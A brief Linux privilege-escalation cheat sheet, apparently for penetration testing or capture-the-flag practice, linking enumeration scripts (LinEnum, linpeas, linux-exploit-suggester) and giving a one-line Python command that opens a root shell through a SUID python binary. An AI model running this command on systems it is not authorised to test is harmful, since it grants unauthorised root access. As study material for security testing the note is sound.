# Becoming root

To escalate privileges you need to find vulnerabilities in the target system.
Find this with any of these scripts:

- [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
- [linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
- [linux-exploit-suggester](https://raw.githubusercontent.com/knarkzel/linux-exploit-suggester/master/linux-exploit-suggester.sh)

## Python binary

If you found a `python` binary with SUID, run following to become root:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```